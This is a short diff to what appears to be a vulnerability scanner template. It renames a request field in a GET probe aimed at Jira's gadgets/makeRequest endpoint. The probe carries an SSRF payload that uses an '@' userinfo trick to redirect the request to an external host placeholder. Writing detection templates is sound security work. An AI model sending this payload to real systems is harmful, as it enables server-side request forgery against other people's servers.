@@ -16,7 +16,7 @@ variables:
 requests:
   - method: GET
     redirect: true
-    path: >-
+    url: >-
      {{.BaseURL}}{{.jira}}plugins/servlet/gadgets/makeRequest?url=https://127.0.0.1:443@{{.ssrf}}
     headers:
       - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
